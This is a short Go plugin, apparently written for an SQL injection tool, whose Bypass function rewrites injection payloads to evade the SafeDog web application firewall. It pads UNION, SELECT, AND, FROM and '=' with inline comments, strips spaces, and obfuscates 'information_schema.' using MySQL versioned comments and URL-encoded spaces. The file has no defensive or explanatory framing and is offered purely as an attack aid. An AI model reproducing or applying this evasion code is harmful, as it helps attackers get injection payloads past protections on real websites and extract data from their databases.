package main

import (
	"strings"
)

var (
	Plus_Author   = "ExpLang"        // 插件作者
	Plus_Version  = "1.0"            // 插件版本
	Plus_Describe = "Bypass_SafeDog" // 插件描述
)

func Bypass(Value string) string {
	var Value_Bypass string
	var bypass_SafeDog_str = "/*x^x*/"
	Value_Bypass = strings.Replace(Value, "UNION", bypass_SafeDog_str+"UNION"+bypass_SafeDog_str, -1)
	Value_Bypass = strings.Replace(Value_Bypass, "SELECT", bypass_SafeDog_str+"SELECT"+bypass_SafeDog_str, -1)
	Value_Bypass = strings.Replace(Value_Bypass, "AND", bypass_SafeDog_str+"AND"+bypass_SafeDog_str, -1)
	Value_Bypass = strings.Replace(Value_Bypass, "=", bypass_SafeDog_str+"="+bypass_SafeDog_str, -1)
	Value_Bypass = strings.Replace(Value_Bypass, " ", bypass_SafeDog_str, -1)
	Value_Bypass = strings.Replace(Value_Bypass, "information_schema.", "%20%20/*!%20%20%20%20INFOrMATION_SCHEMa%20%20%20%20*/%20%20/*^x^^x^*/%20/*!.*/%20/*^x^^x^*/", -1)
	Value_Bypass = strings.Replace(Value_Bypass, "FROM", bypass_SafeDog_str+"FROM"+bypass_SafeDog_str, -1)

	return Value_Bypass
}

func INFO() []string {
	return []string{Plus_Author, Plus_Version, Plus_Describe}
}
